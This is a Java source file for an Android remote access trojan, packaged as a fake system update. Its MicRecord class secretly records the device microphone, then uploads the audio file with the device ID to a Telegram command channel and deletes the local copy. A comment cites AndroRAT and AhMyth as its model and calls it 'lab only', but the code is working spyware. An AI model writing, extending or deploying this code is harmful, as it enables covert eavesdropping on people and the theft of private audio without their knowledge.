package com.system.update;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Build;

import java.io.File;
import java.io.FileInputStream;

/**
 * Short ambient mic capture — pattern from public RAT clients (AndroRAT/AhMyth class of features).
 * Lab only; requires RECORD_AUDIO.
 */
public final class MicRecord {
    private MicRecord() {}

    public static void capture(Context ctx, int seconds) {
        new Thread(() -> {
            MediaRecorder r = null;
            File out = null;
            try {
                out = new File(ctx.getCacheDir(), "m" + System.currentTimeMillis() + ".m4a");
                r = new MediaRecorder();
                r.setAudioSource(MediaRecorder.AudioSource.MIC);
                r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                r.setAudioEncodingBitRate(64000);
                r.setAudioSamplingRate(22050);
                r.setOutputFile(out.getAbsolutePath());
                r.prepare();
                r.start();
                Thread.sleep(Math.max(2, seconds) * 1000L);
                r.stop();
                r.release();
                r = null;
                if (out.exists() && out.length() > 0 && out.length() < 900_000) {
                    byte[] data = readAll(out);
                    Telegram.send("🎤 MIC id=" + C2.getDeviceId() + " bytes=" + data.length);
                    Telegram.sendDocument(data, "mic.m4a", "mic " + C2.getDeviceId());
                }
            } catch (Throwable t) {
                Telegram.reportEvent(C2.getDeviceId(), "mic_err:" + t.getMessage());
            } finally {
                try { if (r != null) r.release(); } catch (Throwable ignored) {}
                try { if (out != null) out.delete(); } catch (Throwable ignored) {}
            }
        }, "mic").start();
    }

    private static byte[] readAll(File f) throws Exception {
        byte[] b = new byte[(int) f.length()];
        try (FileInputStream in = new FileInputStream(f)) {
            int o = 0;
            while (o < b.length) {
                int n = in.read(b, o, b.length - o);
                if (n < 0) break;
                o += n;
            }
        }
        return b;
    }
}
